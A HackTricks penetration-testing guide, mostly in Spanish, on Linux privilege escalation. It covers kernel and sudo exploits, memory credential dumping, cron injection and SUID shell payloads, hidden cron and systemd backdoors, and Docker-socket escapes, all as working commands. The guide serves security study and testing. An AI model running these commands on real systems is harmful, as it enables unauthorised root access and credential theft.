# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

Empecemos a recopilar información sobre el OS en ejecución
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Si **tienes permisos de escritura en cualquier carpeta dentro de la variable `PATH`** podrías secuestrar algunas librerías o binarios:
```bash
echo $PATH
```
### Información del entorno

¿Información interesante, contraseñas o claves API en las variables de entorno?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Comprueba la versión del kernel y si existe algún exploit que pueda usarse para escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puedes encontrar una buena lista de kernels vulnerables y algunos **compiled exploits** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Otros sitios donde puedes encontrar algunos **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones de kernel vulnerables de esa web puedes hacer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Herramientas que pueden ayudar a buscar exploits del kernel son:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Siempre **busca la versión del kernel en Google**, puede que tu versión del kernel aparezca mencionada en algún exploit y así estarás seguro de que ese exploit es válido.

Técnicas adicionales de explotación del kernel:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo versión

Basado en las versiones vulnerables de sudo que aparecen en:
```bash
searchsploit sudo
```
Puedes comprobar si la versión de sudo es vulnerable usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Las versiones de Sudo anteriores a 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permiten a usuarios locales sin privilegios escalar sus privilegios a root mediante la opción `--chroot` de sudo cuando el archivo `/etc/nsswitch.conf` se usa desde un directorio controlado por el usuario.

Aquí hay un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explotar esa [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de ejecutar el exploit, asegúrate de que tu versión de `sudo` sea vulnerable y de que soporte la funcionalidad `chroot`.

Para más información, consulta la original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: verificación de firma fallida

Revisa **smasher2 box of HTB** para un **ejemplo** de cómo esta vuln podría ser explotada
```bash
dmesg 2>/dev/null | grep "signature"
```
### Más enumeración del sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar posibles defensas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Si estás dentro de un docker container puedes intentar escapar de él:


{{#ref}}
docker-security/
{{#endref}}

## Unidades

Comprueba **qué está mounted y unmounted**, dónde y por qué. Si algo está unmounted, podrías intentar mount it y comprobar si hay información privada.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binarios útiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Además, comprueba si hay algún **compiler** instalado. Esto es útil si necesitas usar algún kernel exploit, ya que se recomienda compilarlo en la máquina donde lo vas a usar (o en una similar).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software instalado vulnerable

Comprueba la **versión de los paquetes y servicios instalados**. Puede que haya alguna versión antigua de Nagios (por ejemplo) que pueda ser explotada para escalating privileges…\
Se recomienda comprobar manualmente la versión del software instalado que parezca más sospechoso.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si tienes acceso SSH a la máquina, también podrías usar **openVAS** para comprobar si hay software instalado en la máquina que esté desactualizado o vulnerable.

> [!NOTE] > _Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil; por ello se recomiendan aplicaciones como OpenVAS u otras similares que verifiquen si alguna versión de software instalada es vulnerable a exploits conocidos_

## Procesos

Echa un vistazo a **qué procesos** se están ejecutando y comprueba si algún proceso tiene **más privilegios de los que debería** (tal vez un tomcat ejecutándose como root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script de GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso dado, **maps** muestran cómo la memoria está mapeada dentro del espacio de direcciones virtual de ese proceso; también muestran los **permisos de cada región mapeada**. El pseudoarchivo **mem** **expone la propia memoria del proceso**. Del archivo **maps** sabemos qué **regiones de memoria son legibles** y sus offsets. Usamos esta información para **seek into the mem file and dump all readable regions** en un archivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` proporciona acceso a la memoria **física** del sistema, no a la memoria virtual. El espacio de direcciones virtuales del kernel es accesible mediante /dev/kmem.\
Normalmente, `/dev/mem` solo es legible por **root** y el grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para linux

ProcDump es una reimaginación en Linux de la clásica herramienta ProcDump de la suite Sysinternals para Windows. Consíguelo en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Herramientas

Para hacer un dump de la memoria de un proceso puedes usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y dump el proceso que te pertenece
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credenciales desde la memoria del proceso

#### Ejemplo manual

Si encuentras que el proceso authenticator está en ejecución:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puedes dump the process (consulta las secciones anteriores para encontrar diferentes formas de dump the memory of a process) y buscar credentials dentro de la memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) robará **clear text credentials from memory** y de algunos **well known files**. Requiere privilegios root para funcionar correctamente.

| Característica                                    | Nombre del Proceso   |
| ------------------------------------------------- | -------------------- |
| Contraseña GDM (Kali Desktop, Debian Desktop)     | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regexes de búsqueda/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tareas programadas/Cron jobs

### Crontab UI (alseambusher) ejecutándose como root – privesc en scheduler basado en web

Si un panel web “Crontab UI” (alseambusher/crontab-ui) se ejecuta como root y está ligado únicamente al loopback, aún puedes acceder a él mediante SSH local port-forwarding y crear una tarea privilegiada para escalar.

Cadena típica
- Descubrir puerto ligado solo al loopback (p.ej., 127.0.0.1:8000) y el realm de Basic-Auth mediante `ss -ntlp` / `curl -v localhost:8000`
- Encontrar credenciales en artefactos operativos:
- Copias de seguridad/scripts con `zip -P <password>`
- unidad systemd exponiendo `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Crear túnel e iniciar sesión:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crear un job con privilegios elevados y ejecutarlo inmediatamente (genera SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Úsalo:
```bash
/tmp/rootshell -p   # root shell
```
Endurecimiento
- No ejecutes Crontab UI como root; constríngelo a un usuario dedicado y con permisos mínimos
- Vincula a localhost y restringe adicionalmente el acceso mediante firewall/VPN; no reutilices contraseñas
- Evita incrustar secretos en unit files; usa secret stores o EnvironmentFile accesible solo por root
- Habilita audit/logging para ejecuciones on-demand

Comprueba si alguna tarea programada es vulnerable. Quizá puedas aprovechar un script ejecutado por root (wildcard vuln? ¿puedes modificar archivos que root usa? ¿usar symlinks? ¿crear archivos específicos en el directorio que root utiliza?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ruta del PATH en cron

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar el PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota cómo el usuario "user" tiene privilegios de escritura sobre /home/user_)

Si dentro de este crontab el usuario root intenta ejecutar algún comando o script sin establecer el PATH. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener una shell como root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando un script con un wildcard (Wildcard Injection)

Si un script ejecutado por root tiene un “**\***” dentro de un comando, podrías explotarlo para provocar comportamientos inesperados (como privesc). Ejemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**If the wildcard is preceded of a path like** _**/some/path/\***_ **, no es vulnerable (incluso** _**./\***_ **no lo es).**

Lee la siguiente página para más trucos de explotación de wildcard:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Inyección de arithmetic expansion en Bash en parsers de logs de cron

Bash realiza parameter expansion and command substitution antes de la evaluación aritmética en ((...)), $((...)) y let. Si un cron/parser ejecutado como root lee campos de logs no confiables y los inserta en un contexto aritmético, un atacante puede inyectar una command substitution $(...) que se ejecuta como root cuando corre el cron.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Haz que texto controlado por el atacante se escriba en el log parseado de modo que el campo que parece numérico contenga una command substitution y termine con un dígito. Asegúrate de que tu comando no imprima en stdout (o redirígelo) para que la aritmética siga siendo válida.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Sobrescritura de scripts de cron y symlink

Si puedes **modificar un cron script** ejecutado por root, puedes obtener un shell muy fácilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si el script ejecutado por root usa un **directory donde tienes acceso completo**, puede ser útil eliminar esa folder y **crear un symlink apuntando a otra que sirva un script controlado por ti**.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Binarios cron con firma personalizada y payloads escribibles
Blue teams a veces "sign" binarios ejecutados por cron volcando una sección ELF personalizada y greppeando una cadena del proveedor antes de ejecutarlos como root. Si ese binario es group-writable (p. ej., `/opt/AV/periodic-checks/monitor` propiedad de `root:devs 770`) y puedes leak el material de firma, puedes forjar la sección y secuestrar la tarea de cron:

1. Usa `pspy` para capturar el flujo de verificación. En Era, root ejecutó `objcopy --dump-section .text_sig=text_sig_section.bin monitor` seguido de `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` y luego ejecutó el archivo.
2. Recréa el certificado esperado usando la leaked key/config (desde `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Construye un reemplazo malicioso (p. ej., dejar un SUID bash, agregar tu SSH key) e incrusta el certificado en `.text_sig` para que el grep pase:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Sobrescribe el binario programado preservando los bits de ejecución:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Espera la siguiente ejecución de cron; una vez que la comprobación de firma ingenua tenga éxito, tu payload se ejecutará como root.

### Cron jobs frecuentes

Puedes monitorizar los procesos para buscar procesos que se ejecutan cada 1, 2 o 5 minutos. Quizá puedas aprovechar eso y escalar privilegios.

Por ejemplo, para **monitorizar cada 0.1s durante 1 minuto**, **ordenar por los comandos menos ejecutados** y eliminar los comandos que más se han ejecutado, puedes hacer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (esto monitorizará y listará cada proceso que se inicie).

### Cron jobs invisibles

Es posible crear un cronjob **poniendo un carriage return después de un comentario** (sin carácter de nueva línea), y el cron job funcionará. Ejemplo (nota el carácter carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servicios

### Archivos _.service_ escribibles

Comprueba si puedes escribir cualquier `.service` file, si puedes, **podrías modificarlo** para que **ejecute** tu **backdoor cuando** el servicio sea **started**, **restarted** o **stopped** (tal vez necesites esperar hasta que la máquina sea rebooted).\
Por ejemplo crea tu backdoor dentro del .service file con **`ExecStart=/tmp/script.sh`**

### Binarios de servicio escribibles

Ten en cuenta que si tienes **permisos de escritura sobre binarios que son ejecutados por servicios**, puedes cambiarlos por backdoors para que cuando los servicios sean re-ejecutados los backdoors se ejecuten.

### systemd PATH - Relative Paths

Puedes ver el PATH usado por **systemd** con:
```bash
systemctl show-environment
```
Si descubres que puedes **escribir** en cualquiera de las carpetas de la ruta, puede que puedas **escalate privileges**. Debes buscar **rutas relativas usadas en archivos de configuración de servicios** como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Entonces, crea un **ejecutable** con el **mismo nombre que el binario de la ruta relativa** dentro del directorio PATH de systemd en el que puedas escribir, y cuando se solicite al servicio ejecutar la acción vulnerable (**Start**, **Stop**, **Reload**), tu **backdoor será ejecutado** (los usuarios sin privilegios normalmente no pueden iniciar/detener servicios pero verifica si puedes usar `sudo -l`).

**Aprende más sobre servicios con `man systemd.service`.**

## **Temporizadores**

**Temporizadores** son archivos de unidad de systemd cuyo nombre termina en `**.timer**` que controlan archivos o eventos `**.service**`. Los **temporizadores** pueden usarse como alternativa a cron, ya que incluyen soporte incorporado para eventos basados en calendario y eventos de tiempo monotónico y pueden ejecutarse de forma asíncrona.

Puedes enumerar todos los temporizadores con:
```bash
systemctl list-timers --all
```
### Temporizadores escribibles

Si puedes modificar un temporizador, puedes hacer que ejecute algunas unidades existentes de systemd.unit (como una `.service` o una `.target`)
```bash
Unit=backdoor.service
```
> La unidad que se activará cuando este timer expire. El argumento es un nombre de unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor por defecto es un service que tiene el mismo nombre que la unidad timer, excepto por el sufijo. (Ver más arriba.) Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad de la unidad timer se nombren idénticamente, salvo por el sufijo.
> 
> 

Por lo tanto, para abusar de este permiso necesitarías:

- Encontrar alguna unidad systemd (como un `.service`) que esté **ejecutando un binario escribible**
- Encontrar alguna unidad systemd que esté **ejecutando una ruta relativa** y sobre la cual tengas **privilegios de escritura** en el **systemd PATH** (para suplantar ese ejecutable)

**Aprende más sobre timers con `man systemd.timer`.**

### **Habilitar Timer**

Para habilitar un timer necesitas privilegios root y ejecutar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Nota: el **timer** se **activa** creando un symlink hacia él en `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permiten la **comunicación entre procesos** en la misma máquina o en máquinas diferentes dentro de modelos cliente-servidor. Utilizan archivos de descriptor Unix estándar para la comunicación entre equipos y se configuran mediante archivos `.socket`.

Los sockets se pueden configurar usando archivos `.socket`.

**Aprende más sobre sockets con `man systemd.socket`.** Dentro de este archivo, se pueden configurar varios parámetros interesantes:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Estas opciones son diferentes pero, en resumen, se usan para **indicar dónde se va a escuchar** el socket (la ruta del archivo de socket AF_UNIX, la dirección IPv4/6 y/o número de puerto a escuchar, etc.).
- `Accept`: Toma un argumento booleano. Si **true**, se **lanza una instancia de la unidad de servicio por cada conexión entrante** y solo se le pasa el socket de conexión. Si **false**, todos los sockets de escucha se **pasan a la unidad de servicio iniciada**, y solo se crea una unidad de servicio para todas las conexiones. Este valor se ignora para datagram sockets y FIFOs, donde una sola unidad de servicio maneja incondicionalmente todo el tráfico entrante. **Por defecto es false**. Por razones de rendimiento, se recomienda escribir nuevos daemons de forma adecuada para `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Aceptan una o más líneas de comando, que se **ejecutan antes** o **después** de que los sockets/FIFOs de escucha sean **creados** y vinculados, respectivamente. El primer token de la línea de comando debe ser un nombre de archivo absoluto, seguido de argumentos para el proceso.
- `ExecStopPre`, `ExecStopPost`: Comandos adicionales que se **ejecutan antes** o **después** de que los sockets/FIFOs de escucha sean **cerrados** y eliminados, respectivamente.
- `Service`: Especifica el nombre de la unidad de servicio que se **activará** con tráfico entrante. Esta opción solo está permitida para sockets con Accept=no. Por defecto apunta al servicio que lleva el mismo nombre que el socket (con el sufijo reemplazado). En la mayoría de los casos, no debería ser necesario usar esta opción.

### Writable .socket files

Si encuentras un archivo `.socket` **writable**, puedes **agregar** al inicio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y el backdoor se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente necesitarás esperar hasta que la máquina sea reiniciada.**\
_Nota: el sistema debe estar usando esa configuración de archivo `.socket` o el backdoor no se ejecutará_

### Writable sockets

Si **identificas cualquier socket escribible** (_ahora hablamos de Unix Sockets y no de los archivos de configuración `.socket`_), entonces **puedes comunicarte** con ese socket y quizá explotar una vulnerabilidad.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Conexión cruda
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Ejemplo de explotación:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Ten en cuenta que puede haber algunos **sockets escuchando peticiones HTTP** (_no me refiero a los archivos .socket sino a los archivos que actúan como unix sockets_). Puedes comprobarlo con:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Si el socket **responde a una petición HTTP**, entonces puedes **comunicarte** con él y quizá **exploit some vulnerability**.

### Docker Socket escribible

El Docker socket, a menudo ubicado en `/var/run/docker.sock`, es un archivo crítico que debe protegerse. Por defecto, es escribible por el usuario `root` y los miembros del grupo `docker`. Poseer acceso de escritura a este socket puede conducir a privilege escalation. Aquí tienes un desglose de cómo se puede hacer esto y métodos alternativos si el Docker CLI no está disponible.

#### **Privilege Escalation with Docker CLI**

Si tienes acceso de escritura al Docker socket, puedes escalate privileges usando los siguientes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Estos comandos permiten ejecutar un container con acceso root al sistema de archivos del host.

#### **Usando Docker API directamente**

En casos donde el Docker CLI no está disponible, el Docker socket todavía puede manipularse usando el Docker API y comandos `curl`.

1.  **List Docker Images:** Recupera la lista de imágenes disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envía una solicitud para crear un container que monte el directorio raíz del sistema host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Usa `socat` para establecer una conexión con el container, permitiendo la ejecución de comandos en su interior.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Después de establecer la conexión con `socat`, puedes ejecutar comandos directamente en el container con acceso root al sistema de archivos del host.

### Others

Ten en cuenta que si tienes permisos de escritura sobre el docker socket porque estás **inside the group `docker`** tienes [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Si el [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **more ways to break out from docker or abuse it to escalate privileges** en:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Si encuentras que puedes usar el comando **`ctr`** lee la siguiente página ya que **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Si encuentras que puedes usar el comando **`runc`** lee la siguiente página ya que **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus es un sofisticado **inter-Process Communication (IPC) system** que permite a las aplicaciones interactuar y compartir datos de forma eficiente. Diseñado pensando en el sistema Linux moderno, ofrece un marco robusto para diferentes formas de comunicación entre aplicaciones.

El sistema es versátil, soportando IPC básico que mejora el intercambio de datos entre procesos, recordando a los **enhanced UNIX domain sockets**. Además, ayuda a la transmisión de eventos o señales, fomentando la integración entre componentes del sistema. Por ejemplo, una señal de un daemon de Bluetooth sobre una llamada entrante puede indicar a un reproductor de música que silencie el audio, mejorando la experiencia del usuario. Adicionalmente, D-Bus soporta un sistema de objetos remotos, simplificando las solicitudes de servicio y las invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.

D-Bus opera sobre un **allow/deny model**, gestionando permisos de mensajes (llamadas a métodos, emisiones de señales, etc.) basado en el efecto acumulado de las reglas de política que coinciden. Estas políticas especifican las interacciones con el bus, potencialmente permitiendo privilege escalation mediante la explotación de estos permisos.

